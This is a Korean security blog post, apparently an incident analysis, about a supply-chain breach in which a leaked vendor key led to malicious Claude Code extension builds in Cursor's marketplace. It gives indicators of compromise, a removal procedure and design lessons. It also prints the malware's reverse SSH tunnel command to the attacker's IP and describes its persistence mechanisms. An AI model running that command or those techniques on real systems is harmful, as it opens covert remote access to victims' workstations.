@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다 — 도현의 테크브리프</title>
+<meta name="description" content="Fireworks AI에 발급한 액세스 키 하나가 읽기 전용 공유 버킷의 미마스킹 자격증명을 거쳐, Cursor 확장 마켓플레이스 캐시에 악성 Claude Code 빌드를 직접 써넣는 권한까지 도달했다. 2026-10-29 11시간 노출 창, 최대 5,000명, 그리고 확장 삭제로는 지워지지 않는 리버스 SSH 터널의 코드 레벨 동작과 제거 절차를 정리한다.">
+<link rel="canonical" href="https://dohyeontech.github.io/posts/cursor-fireworks-supply-chain/">
+<meta name="author" content="김도현">
+<meta name="msvalidate.01" content="7F649621B27074264CFFB0DCE372E1A9">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="도현의 테크브리프">
+<meta property="og:title" content="[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다 — 도현의 테크브리프">
+<meta property="og:description" content="Fireworks AI에 발급한 액세스 키 하나가 읽기 전용 공유 버킷의 미마스킹 자격증명을 거쳐, Cursor 확장 마켓플레이스 캐시에 악성 Claude Code 빌드를 직접 써넣는 권한까지 도달했다. 2026-10-29 11시간 노출 창, 최대 5,000명, 그리고 확장 삭제로는 지워지지 않는 리버스 SSH 터널의 코드 레벨 동작과 제거 절차를 정리한다.">
+<meta property="og:url" content="https://dohyeontech.github.io/posts/cursor-fireworks-supply-chain/">
+<meta property="og:image" content="https://dohyeontech.github.io/assets/images/thumb_cursor_fireworks.png">
+<meta property="og:locale" content="ko_KR">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다 — 도현의 테크브리프">
+<meta name="twitter:description" content="Fireworks AI에 발급한 액세스 키 하나가 읽기 전용 공유 버킷의 미마스킹 자격증명을 거쳐, Cursor 확장 마켓플레이스 캐시에 악성 Claude Code 빌드를 직접 써넣는 권한까지 도달했다. 2026-10-29 11시간 노출 창, 최대 5,000명, 그리고 확장 삭제로는 지워지지 않는 리버스 SSH 터널의 코드 레벨 동작과 제거 절차를 정리한다.">
+<meta name="twitter:image" content="https://dohyeontech.github.io/assets/images/thumb_cursor_fireworks.png">
+<link rel="icon" href="/assets/images/favicon.png" type="image/png">
+<link rel="apple-touch-icon" href="/assets/images/favicon.png">
+<link rel="alternate" type="application/rss+xml" title="도현의 테크브리프 RSS" href="/feed.xml">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/variable/pretendardvariable-dynamic-subset.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">
+<link rel="stylesheet" href="/assets/css/style.css?v=315f8666">
+
+</head>
+<body>
+<a class="skip" href="#main">본문으로 건너뛰기</a>
+<header class="site-header">
+  <div class="wrap header__inner">
+    <a class="brand" href="/">
+      <span class="brand__mark" aria-hidden="true"></span>
+      <span class="brand__text">DOHYEON TECH BRIEF<span class="brand__suffix"> // CYBERSECURITY &amp; AI JOURNAL</span></span>
+    </a>
+    <nav class="nav" aria-label="주요 메뉴">
+      <a class="" href="/">홈</a>
+      <a class="" href="/archive/">아카이브</a>
+      <a href="https://dohyeon-sniper-bot.onrender.com/dashboard" target="_blank" rel="noopener">대시보드</a>
+    </nav>
+  </div>
+</header>
+<main id="main">
+<article class="post wrap">
+  <nav class="crumbs" aria-label="위치"><a href="/">홈</a><span>/</span><a href="/archive/">아카이브</a><span>/</span><span class="crumbs__here">공급망 공격</span></nav>
+
+  <header class="post__head">
+    <div class="post__meta">
+      <span class="badge">공급망 공격</span>
+      <time datetime="2026-11-15">2026년 11월 15일</time>
+      <span class="post__reading">19분 읽기</span>
+    </div>
+    <h1 class="post__title">[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다</h1>
+    <p class="post__summary">Fireworks AI에 발급한 액세스 키 하나가 읽기 전용 공유 버킷의 미마스킹 자격증명을 거쳐, Cursor 확장 마켓플레이스 캐시에 악성 Claude Code 빌드를 직접 써넣는 권한까지 도달했다. 2026-10-29 11시간 노출 창, 최대 5,000명, 그리고 확장 삭제로는 지워지지 않는 리버스 SSH 터널의 코드 레벨 동작과 제거 절차를 정리한다.</p>
+    <div class="post__byline">
+      <span class="post__author">김도현</span>
+      <span class="post__tags"><span class="tag">#공급망공격</span><span class="tag">#Cursor</span><span class="tag">#FireworksAI</span><span class="tag">#ClaudeCode</span><span class="tag">#리버스SSH</span><span class="tag">#LLMJacking</span></span>
+    </div>
+  </header>
+
+  <figure class="post__hero">
+    <img src="/assets/images/thumb_cursor_fireworks.png?v=b7de5bbf" alt="[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다" width="1200" height="675">
+  </figure>
+
+  <div class="post__body">
+<p>2026년 10월 29일 오전 2시 27분(PT)부터 오후 1시 35분까지, 약 11시간 동안 Cursor의 VS Code 확장 마켓플레이스에서 <code>Anthropic.claude-code</code> 확장의 2.1.312와 2.1.313 빌드가 정상 배포본과 구분되지 않는 형태로 내려받아졌다. Anthropic이 만든 확장이 아니었고, Anthropic 제품의 취약점도 아니었다. Cursor가 11월 13일 공개한 사고 보고서는 그 악성 빌드가 어디서 왔는지를 처음으로 끝까지 설명한다 — 추론·학습 벤더인 Fireworks AI에 Cursor가 발급했던 <strong>액세스 키 하나</strong>에서 출발해, 데이터 공유용 읽기 전용 버킷, 내부 SaaS 도구들, 그리고 마지막에 <strong>확장을 게시할 수 있는 권한</strong>까지 이어지는 다섯 단계 사슬이다.</p>
+<p>이 사건이 단순한 데이터 유출과 다른 이유는 침해의 끝이 데이터가 아니라 <strong>배포 경로</strong>였다는 점이다. 개발자의 노트북에 확장으로 들어간 코드는 사용자 몫의 소프트웨어가 아니라 공급자의 신뢰 그 자체를 실행한다. Cursor는 최대 5,000명이 악성 빌드를 받았을 수 있다고 추정했고, 코드 오류와 관리자 권한 요구 때문에 대부분의 호스트에서 SSH 터널 자체는 열리지 않았다고 밝혔다. 그러나 터널이 실패해도 공격자 공개키는 <code>authorized_keys</code>에 남았고, 지속성 스크립트는 확장 디렉터리 바깥에 심겼다. 확장을 삭제하는 것으로 끝나지 않는 침해다.</p>
+<p>같은 달 Fireworks AI는 두 건의 침해를 연달아 공개했다. 10월 6일 내부 자격증명 오용으로 일부 고객 계정의 평가 작업 환경변수(API 키·토큰)가 노출됐고, 10월 23일에는 R&amp;D 머신을 호스팅하던 서드파티 클라우드가 뚫리면서 개발 머신 접근과 추가 고객 데이터(청구 정보, 일부 고객의 시크릿·데이터셋·미완성 모델 가중치) 영향이 확인됐다. Unit 42가 포렌식에 투입됐고, Fireworks는 금전 동기의 범죄 조직이 훔친 LLM 접근 권한을 불법 라우팅 게이트웨이에 파는 <strong>LLMJacking</strong>과 연관됐다고 밝혔다. Wiz는 이번 달 AI 개발 플랫폼을 겨냥한 연쇄 침해(Railway의 부정 AI 과금 약 74만 달러, Northflank, Lightning AI, OpenCode, Warp)를 "Black October"이라 명명했다. Cursor 사슬은 그 연쇄의 하류에 있는 한 갈래지만, 피해의 형태는 가장 나쁜 쪽이다 — 돈이 아니라 개발자 워크스테이션의 원격 접근이다.</p>
+<h2>1. 다섯 단계 사슬: '읽기 전용' 키가 배포 권한이 되기까지</h2>
+<p>Cursor 보고서가 밝힌 경로는 각 단계가 다음 단계의 열쇠를 넘겨주는 구조다. 어느 한 지점에서 자격증명이 범위를 넘지 못했다면 사슬은 끊겼다.</p>
+<div class="codeblock"><pre><code>[1] Fireworks에 발급한 Cursor 액세스 키가 Fireworks 쪽에서 노출
+        │  (키 소유 = Cursor의 공유 데이터 접근 권한)
+        ▼
+[2] 읽기 전용 공유 스토리지 버킷 전체 복사
+     └ 2025년 위주 코딩 에이전트 트레이스 (Privacy Mode 미사용, 학습 허용분)
+     └ 일부 트레이스에 마스킹되지 않은 자격증명  ← 사슬의 실제 결절
+        │  (트레이스에 섞여 있던 제3자 SaaS 자격증명)
+        ▼
+[3] Cursor 내부 SaaS 도구 접근
+     └ 아카이브된 비프로덕션 소스 저장소(사업 연락처 일부)
+     └ 고객지원 데이터·이메일 대화, 사용 지표·연락처
+     └ 일부 코딩 에이전트 대화 요약
+     └ 고객이 지원팀에 보낸 자격증명
+        │  (내부 시스템에서 꺼낸 '확장 배포용' 자격증명)
+        ▼
+[4] 마켓플레이스 캐시에 악성 VSIX 직접 게시 (2026-10-29 02:27~13:35 PT)
+        │  (최대 5,000명이 특정 캐시 버전 요청)
+        ▼
+[5] 개발자 호스트에서 로더 실행 → SSH 키·지속성·리버스 터널</code></pre><button class="copy" type="button" aria-label="코드 복사">COPY</button></div>
+<p>노출 규모는 Cursor 기준으로 트레이스가 전체 사용자의 <strong>0.05% 미만</strong>, API 자격증명이 <strong>0.01% 미만</strong>이다. 비율만 보면 작다. 그러나 이 사건에서 그 비율은 피해의 크기를 말해주지 않는다. 트레이스에 섞인 자격증명은 "어느 고객이 몇 명"의 문제가 아니라 <strong>어느 시스템에 접근할 수 있는 키였는가</strong>의 문제였고, 그중 하나가 마켓플레이스 배포 경로를 열었다. 데이터 유출 사고의 심각도는 유출된 사용자 수가 아니라, 유출된 자격증명이 다음에 무엇을 할 수 있는지로 결정된다.</p>
+<p>[4]단계의 표현을 그대로 읽으면 중요한 사실이 하나 드러난다. 공격자는 확장을 "게시"한 것이 아니라 <strong>마켓플레이스 제공에 쓰이는 캐시에 직접 사본을 놓았다</strong>. Cursor가 공개한 문장만으로 판단하면, 그 경로에서 실질적인 배포 승인 경계는 아티팩트 서명 검증이 아니라 <strong>그 캐시에 쓸 수 있는 자격증명의 보유 여부</strong>였다. 패키지 이름 <code>Anthropic.claude-code</code>는 게시자 네임스페이스를 사칭했고, 사용자 입장에서 그 이름은 신뢰의 전부다. Open VSX 원본에는 악성코드가 없었고 Anthropic 시스템도 침해되지 않았다 — 즉 이 침해는 "확장 생태계"의 문제가 아니라 <strong>한 공급자의 서빙 캐시 무결성</strong> 문제였다.</p>
+<h2>2. 근본 원인: 자격증명이 흐르는 경로를 자산으로 세지 않았다</h2>
+<p>이 사슬에는 메모리 손상도, 경쟁 조건도, 인증 우회 취약점도 없다. 있는 것은 세 개의 설계 판단이고, 각각이 다음 단계의 권한을 넓혔다.</p>
+<p><strong>첫째, 데이터 평면에 평문 자격증명이 흘렀다.</strong> 모델 학습용으로 공유하는 트레이스는 본질적으로 프롬프트·도구 호출·터미널 출력의 기록이다. 개발자가 에이전트에게 붙여넣는 값에는 API 키와 토큰이 포함되고, 마스킹이 한 번 새면 그 값은 "학습 데이터"라는 이름으로 저장소에 남는다. Cursor의 사후 조치 목록에 <code>모든 코드 저장소에 시크릿 스캐닝 추가</code>가 있는데, 이번에 뚫린 지점은 코드 저장소가 아니라 <strong>트레이스와 지원 티켓</strong>이었다. 시크릿 스캐닝을 코드에만 걸어두면 데이터 평면은 그대로 사각지대로 남는다.</p>
+<p><strong>둘째, 벤더 키의 권한 범위가 데이터 범위와 같았다.</strong> Cursor가 Fireworks에 발급한 키는 "함께 학습하기 위해 공유한 데이터" 전체를 읽을 수 있었다. 문제는 그 버킷이 읽기 전용이었다는 사실이 안전장치로 읽힌다는 착각이다. 읽기 전용은 <strong>변조</strong>를 막지만 <strong>열람</strong>은 막지 않는다. 공유 데이터 버킷의 위협 모델은 "상대가 데이터를 바꾸는가"가 아니라 "상대 자격증명이 탈취되면 무엇이 복사되는가"다. 여기에 더해 Fireworks 쪽에서 그 키가 어떻게 보관됐는지는 두 회사의 공개 문서 어디에도 특정되지 않았다. Fireworks는 10월 6일 사고에서 평가 작업 환경변수에 시크릿이 들어 있었다고 밝혔고, Cursor는 "키가 Fireworks에 의해 노출됐다"고만 적었다. 어느 사고에서 어느 키가 노출됐는지 연결하는 문장은 양쪽 모두에 없다 — 공급망 사고의 귀속이 늘 그렇듯, 경계 양쪽이 각자의 문장만 남긴다.</p>
+<p><strong>셋째, 발행 권한이 내부 시스템 자격증명에 얹혀 있었다.</strong> Cursor의 표현은 "내부 시스템에서 유출된 데이터에 있던 자격증명을 사용해" 악성 사본을 캐시에 놓았다는 것이다. 즉 확장 배포라는 <strong>공급자 신뢰의 최상위 동작</strong>이, 데이터 평면과 같은 자격증명 저장소에서 꺼낼 수 있는 자격증명으로 수행됐다. 정상적인 분리는 이렇게 생겨야 한다.</p>
+<div class="codeblock"><pre><code>데이터 평면 (학습·지원·분석)         발행 평면 (마켓플레이스)
+  └ 벤더 공유 키, 읽기 전용            └ 게시 권한, 서명 키
+  └ 트레이스·티켓·지표 저장소          └ VSIX 캐시, 게시자 레지스트리
+  └ 유출 시: 데이터 열람               └ 유출 시: 임의 코드 배포
+        └────────── 자격증명 저장소 공유 금지 ──────────┘</code></pre><button class="copy" type="button" aria-label="코드 복사">COPY</button></div>
+<p>이 두 평면이 같은 자격증명 저장소를 쓰는 순간, 트레이스 한 줄에 섞인 키가 임의 코드 배포로 승격된다. Cursor가 사후에 "모든 노출 자격증명 회전"과 "서비스 제공자 전반의 네트워크 접근 제한 확대"를 넣은 것은 이 승격 경로를 끊는 조치로 읽힌다. 다만 구조적으로 더 강한 해법은 자격증명 회전이 아니라 <strong>발행 권한을 사람이 승인하는 별도 경로로 분리하고, 게시자 서명을 서빙 시점에 검증</strong>하는 것이다.</p>
+<h2>3. 익스플로잇 체인: 모듈 로드 한 줄에서 리버스 SSH 터널까지</h2>
+<p>악성 VSIX의 변조 지점은 <code>extension.js</code>다. Microsoft 위협 인텔리전스가 복원한 로더는 확장의 정상 초기화 <strong>이전</strong>에 실행되는 함수로, Node.js API만으로 정보 수집·파일 수정·OS 명령 실행을 수행한다. 별도 바이너리를 내려받지 않고 내장 도구만 쓰며, 명령 출력을 억제하고 오류를 조용히 삼킨다. 확장은 로드 후에도 정상 동작하기 때문에 사용자는 이상을 느끼지 못한다.</p>
+<p>수집 항목은 호스트명, 사용자명, OS, 아키텍처, 홈 디렉터리, 작업 디렉터리, Git 설정 이메일, 그리고 <strong>환경변수 이름</strong> 중 <code>KEY</code>, <code>TOKEN</code>, <code>SECRET</code>, <code>PASS</code>, <code>AWS</code>, <code>GCP</code>가 들어간 최대 40개다. 값이 아니라 이름만 보낸다는 점이 흥미롭다. 이는 즉시 탈취가 아니라 <strong>어떤 종류의 시크릿이 이 호스트에 있는지의 목록</strong>을 만드는 정찰이다. 공인 IP는 <code>ifconfig.me</code>와 <code>api.ipify.org</code> 같은 정상 서비스로 조회하고, 결과는 <code>hxxp://134[.]209[.]82[.]225:8099/beacon</code>으로 POST된다.</p>
+<p>SSH 단계는 역할이 다른 <strong>두 개의 신원</strong>을 쓴다. 하나는 피해자 계정에 대한 접근을 허가하는 공개키(<code>svc-telemetry</code> 주석, 지문 <code>SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk</code>)이고, 다른 하나는 터널 서버로 나가는 연결을 인증하는 개인키다. 로더는 <code>authorized_keys</code>에 <code>svc-telemetry</code> 표식이 없을 때만 키를 덧붙이고, 개인키는 호스트명과 홈 경로에서 파생한 10자리 16진수를 붙인 <code>.stk_&lt;10 hex&gt;</code> 임시 파일로 떨어뜨린 뒤 <code>ssh -i</code>로 넘긴다.</p>
+<p>터널 명령줄은 목적이 그대로 드러난다.</p>
+<div class="codeblock"><pre><code>ssh -N -R '*:0:localhost:22' \
+    -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
+    -o ExitOnForwardFailure=yes -o IdentitiesOnly=yes \
+    -i &lt;홈경로 해시&gt;.stk_&lt;10 hex&gt; tunnel@134.209.82.225</code></pre><button class="copy" type="button" aria-label="코드 복사">COPY</button></div>
+<p><code>-R '*:0:localhost:22'</code>는 원격 서버에 포트를 하나 할당받아, 그 포트로 들어온 연결을 <strong>피해자 루프백의 22번</strong>으로 넘기라는 뜻이다. 호스트 키 검증을 끄고(<code>StrictHostKeyChecking=no</code>), <code>known_hosts</code>를 <code>/dev/null</code>로 우회하며, 대화형 프롬프트를 없애 자동 재연결이 가능하게 했다. 유닉스 계열에서는 <code>autossh -M 0</code>을 우선 시도하고 없으면 <code>ssh</code>로 떨어지며, Windows에서는 숨김 PowerShell 루프를 쓴다. 루프는 SSH가 죽고 60초 뒤 다시 붙는다.</p>
+<p>지속성은 플랫폼별로 정상 모니터링 컴포넌트를 사칭한다.</p>
+<div class="table-wrap"><table><thead><tr><th>플랫폼</th><th>시작 지점</th><th>주요 아티팩트</th></tr></thead><tbody><tr><td>macOS</td><td>사용자 LaunchAgent (<code>RunAtLoad</code>, <code>KeepAlive</code>)</td><td><code>~/Library/LaunchAgents/com.apple.sysmond.plist</code>, <code>~/.config/.smt</code>, <code>~/.config/.smtk</code></td></tr><tr><td>Linux</td><td>사용자 crontab <code>@reboot</code></td><td><code>~/.config/.smt</code>, <code>~/.config/.smtk</code>, <code>/tmp/.stk_&lt;10 hex&gt;</code></td></tr><tr><td>Windows</td><td><code>SysMon</code> 예약 작업 (SYSTEM 실행 시도)</td><td><code>%USERPROFILE%\.config\smt.cmd</code>, <code>%USERPROFILE%\.config\smtk</code>, <code>%TEMP%\.stk_&lt;10 hex&gt;</code></td></tr><tr><td>Windows 대체</td><td>시작 프로그램 폴더 배치 파일</td><td><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd</code></td></tr></tbody></table></div>
+<p>이름이 <code>SysMon</code>, <code>com.apple.sysmond</code>인 것은 의도적이다. 관리자가 프로세스 목록에서 봤을 때 시스템 모니터링으로 보이게 만든 위장이고, Microsoft는 같은 이유로 "이름만으로 악성 여부를 판단하지 말고 각 시작 개체의 실행 내용을 확인하라"고 권고한다.</p>
+<p>성공과 실패를 구분해서 읽어야 한다. 역방향 터널이 열리려면 피해자 호스트의 SSH 서비스가 켜져 있어야 하고(<code>systemsetup -setremotelogin on</code>, <code>Add-WindowsCapability ... OpenSSH.Server</code> 시도), 그건 관리자 권한을 요구한다. Cursor는 코드 자체의 오류와 권한 요구 때문에 대부분의 macOS·Windows 호스트에서 이 단계가 실패했다고 밝혔다. 하지만 실패한 것은 <strong>터널</strong>이지 <strong>침해</strong>가 아니다. 공격자 공개키는 이미 <code>authorized_keys</code>에 들어갔고, 지속성 스크립트는 확장 디렉터리 밖에 남았고, 호스트 정보는 전송됐다. 서버가 내려간 지금도 그 키와 스크립트는 로컬에 그대로 있을 수 있다.</p>
+<div class="codeblock"><pre><code># Cursor 공지가 공개한 침해 지표 (2026-10-29 노출분)
+패키지      Anthropic.claude-code 2.1.312 / 2.1.313 (darwin-arm64, win32-x64)
+VSIX SHA256 fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364  (2.1.312 / darwin)
+            3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081  (2.1.312 / win32)
+            80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c  (2.1.313 / darwin)
+            6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731  (2.1.313 / win32)
+extension.js SHA256 ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15
+네트워크     134[.]209[.]82[.]225  (22/tcp 터널, 8099/tcp beacon)
+             hxxp://134[.]209[.]82[.]225:8099/beacon, 127[.]0[.]0[.]1:8099/beacon
+SSH 키       ssh-ed25519 ...svc-telemetry  지문 SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk
+파일          ~/.config/.smt, ~/.config/.smtk, .stk_&lt;10 hex&gt;, smt.cmd, sysmon.cmd
+시작 개체     com.apple.sysmond(LaunchAgent), SysMon(예약 작업), Startup\sysmon.cmd
+프로세스      ssh -N -R '*:0:localhost:22', autossh -M 0</code></pre><button class="copy" type="button" aria-label="코드 복사">COPY</button></div>
+<h2>4. 제거와 재설계: 호스트에서 확인할 것, 플랫폼이 분리해야 할 것</h2>
+<p><strong>호스트 점검.</strong> 가장 빠른 판별은 <code>authorized_keys</code>의 표식이다. macOS·Linux는 <code>grep -qs svc-telemetry ~/.ssh/authorized_keys</code>, Windows는 <code>%USERPROFILE%\.ssh\authorized_keys</code>와 <code>C:\ProgramData\ssh\administrators_authorized_keys</code>를 함께 본다. 키가 없더라도 확장 설치 기록, <code>.stk_</code> 파일, 시작 개체를 별도로 확인해야 한다. Microsoft는 이름이 같은 정상 모니터링 소프트웨어가 있을 수 있으므로 시작 개체의 <strong>실행 내용</strong>을 확인하고, 키를 지울 때도 지문을 대조해 정확히 그 항목만 제거하면서 정상 SSH 키와 원격 개발 설정을 보존하라고 권고한다.</p>
+<p><strong>제거 순서.</strong> 확장 삭제가 첫 단계가 되면 안 된다. 증거 보존 → 호스트 격리 → 공격자 키·터널 프로세스·지속성 개체·확장 제거 → 신뢰할 수 있는 다른 시스템에서 자격증명 회전과 세션 폐기 → 재구축 여부 판단 순이다. 노출 창 동안 그 호스트에 있던 토큰·쿠키·SSH 키는 "이름만 수집됐다"는 이유로 안전하다고 볼 수 없다. 터널이 열리지 않았더라도 로컬 코드 실행은 성립했고, 그 코드는 임의 명령을 실행할 능력을 가졌다. Cursor의 조사 스크립트와 제거 스크립트는 공지에 첨부돼 있으니 실행 전에 내용을 확인하고, 실행 후에도 나열된 아티팩트가 남지 않았는지 다시 검증해야 한다.</p>
+<p><strong>플랫폼 운영자에게 남는 설계 과제.</strong> 이 사슬은 네 가지 분리로 끊긴다.</p>
+<p>첫째, <strong>데이터 평면의 시크릿을 유입 시점에 걸러야 한다.</strong> 코드 저장소 스캐닝은 이미 하던 일이고 이번에 뚫린 곳이 아니다. 에이전트 트레이스, 지원 티켓, 로그 아카이브처럼 "데이터"로 분류된 저장소에 같은 스캐너를 걸고, 마스킹 실패를 파이프라인 실패로 처리해야 한다.</p>
+<p>둘째, <strong>벤더 키는 데이터셋·작업 단위로 쪼개고 수명을 짧게 가져가야 한다.</strong> 하나의 읽기 전용 키가 공유 버킷 전체를 읽는 구조는 편리하지만, 그 편리함이 곧 단일 실패점이다. 가능하면 버킷 단위·접두사 단위 권한, 짧은 TTL, 발급자 네트워크 대역 제한을 함께 건다. Fireworks가 사후에 "불필요한 상향 권한 제거"와 "네트워크 경로 제한"을 넣은 것이 같은 방향이다.</p>
+<p>셋째, <strong>발행 권한은 데이터 자격증명과 다른 저장소에 두고, 서빙 시점에 게시자 신원을 검증해야 한다.</strong> 캐시에 쓸 수 있는 자격증명 하나가 게시자 네임스페이스 사칭으로 이어지지 않으려면, 아티팩트가 실제 게시자의 서명을 갖고 있는지 내려주는 순간 확인해야 한다. 서명 없이 이름만 맞으면 통과하는 구조는 마켓플레이스가 아니라 파일 서버다.</p>
+<p>넷째, <strong>개발자 워크스테이션의 이그레스를 기본 차단으로 둬야 한다.</strong> 이 악성코드의 C2는 아웃바운드 22번 역터널이다. 업무 단말에서 임의 프로세스가 외부 22번으로 나가는 것을 허용하는 조직은, 지속성 개체를 다 지워도 같은 채널을 다시 열 수 있다. <code>autossh</code>, <code>ssh -R</code> 조합에 대한 프로세스 탐지와 함께, 확장 설치 쿨다운과 게시자 허용 목록(Cursor의 하드닝 가이드가 제공하는 통제)을 켜두면 패키지가 올라온 직후의 창을 줄일 수 있다.</p>
+<p>이번 사건의 교훈은 "AI 도구를 조심하자"로 요약되지 않는다. Cursor가 사후에 재배포한 것은 프로덕션 인프라 전체였고, 회전한 것은 발견된 모든 자격증명이었다. 그 정도의 조치가 필요했던 이유는 침해의 시작이 코드 결함이 아니라 <strong>신뢰 경계를 그은 방식</strong>이었기 때문이다. 공급망은 계약서가 아니라 자격증명 그래프다. 어느 키가 어느 데이터를 읽고, 그 데이터가 어느 키를 품고 있고, 그 키가 어느 평면에 쓸 수 있는지 — 이 질문에 답하지 못하는 조직은 자기 마켓플레이스가 아니라 남의 버킷에서 시작된 사슬의 다섯 번째 단계에 서 있게 된다.</p>
+<p><em>참고 자료: <a href="https://cursor.com/blog/security-incident-update">Cursor 사고 보고서 (2026-11-13)</a>, <a href="https://cursor.com/blog/claude-code-extension-security-notice">Cursor 보안 공지 — 악성 확장·IOC·제거 스크립트 (2026-10-29)</a>, <a href="https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/">Microsoft Security — 지속형 SSH 백도어 분석 (2026-10-30)</a>, <a href="https://fireworks.ai/security/bulletins/october-2026-security-incident">Fireworks AI 보안 공지 — 2026년 10월 사고 (10-10)</a>, <a href="https://fireworks.ai/security/bulletins/october-2026-security-incident-update">Fireworks AI 공지 업데이트 (11-09)</a>, <a href="https://www.bleepingcomputer.com/news/security/cursor-confirms-security-breach-led-to-malicious-claude-code-extension/">BleepingComputer (2026-11-14)</a>, <a href="https://www.wiz.io/blog/black-october-for-ai-developer-platforms">Wiz — Black October</a></em></p>
+  </div>
+
+  <div class="post__foot">
+    <div class="post__tags post__tags--foot"><span class="tag">#공급망공격</span><span class="tag">#Cursor</span><span class="tag">#FireworksAI</span><span class="tag">#ClaudeCode</span><span class="tag">#리버스SSH</span><span class="tag">#LLMJacking</span></div>
+    <p class="post__note">이 리포트는 공개된 연구·공지·패치 자료를 근거로 작성되었습니다. 인용된 침해 지표는 해당 벤더와 연구기관의 발표 시점 기준입니다.</p>
+  </div>
+
+<nav class="pager"><a class="pager__item" href="/posts/screenconnect-rmm-accesskey-bypass-sckit/"><span>이전 글</span><strong>[긴급 분석] ScreenConnect RMM+ 빈 액세스 키 인증 우회 — 48개 조직을 넘긴 SCKit 공급망 캠페인</strong></a></nav>
+</article>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": ""[침해 분석] Cursor × Fireworks 공급망 침해 — 추론 벤더 키 하나가 악성 Claude Code 확장 배포 권한까지 넘었다"",
+  "description": ""Fireworks AI에 발급한 액세스 키 하나가 읽기 전용 공유 버킷의 미마스킹 자격증명을 거쳐, Cursor 확장 마켓플레이스 캐시에 악성 Claude Code 빌드를 직접 써넣는 권한까지 도달했다. 2026-10-29 11시간 노출 창, 최대 5,000명, 그리고 확장 삭제로는 지워지지 않는 리버스 SSH 터널의 코드 레벨 동작과 제거 절차를 정리한다."",
+  "datePublished": "2026-11-15",
+  "dateModified": "2026-11-15",
+  "image": "https://dohyeontech.github.io/assets/images/thumb_cursor_fireworks.png?v=b7de5bbf",
+  "author": {"@type": "Person", "name": "김도현"},
+  "publisher": {"@type": "Organization", "name": "DOHYEON TECH BRIEF"},
+  "mainEntityOfPage": "https://dohyeontech.github.io/posts/cursor-fireworks-supply-chain/",
+  "inLanguage": "ko"
+}
+</script>
+
+</main>
+<footer class="site-footer">
+  <!-- 광고·제휴·후원 슬롯: 필요할 때 이 자리에 스크립트나 링크 블록을 넣는다. (기본은 비움) -->
+  <div class="wrap footer__inner">
+    <div class="footer__col footer__col--brand">
+      <div class="footer__brand">DOHYEON TECH BRIEF</div>
+      <p class="footer__desc">제로데이·공급망 공격·AI 보안을 소스 레벨에서 분석하는 엔지니어링 저널.</p>
+    </div>
+    <div class="footer__col">
+      <div class="footer__head">PAGES</div>
+      <a href="/">홈</a>
+      <a href="/archive/">아카이브</a>
+      <a href="/about/">소개</a>
+      <a href="/feed.xml">RSS</a>
+    </div>
+    <div class="footer__col">
+      <div class="footer__head">CONTACT</div>
+      <a href="mailto:dohyeon.tech@proton.me">dohyeon.tech@proton.me</a>
+      <a href="https://dohyeon-sniper-bot.onrender.com/dashboard" target="_blank" rel="noopener">가상 트레이딩 대시보드</a>
+    </div>
+  </div>
+  <div class="wrap footer__bottom">
+    <span>© 2026 김도현. 분석 내용은 공개된 자료를 근거로 작성됩니다.</span>
+    <span class="footer__mono">BUILT STATIC · GITHUB PAGES</span>
+  </div>
+</footer>
+<script src="/assets/js/main.js?v=fca38355" defer></script>
+</body>
+</html>
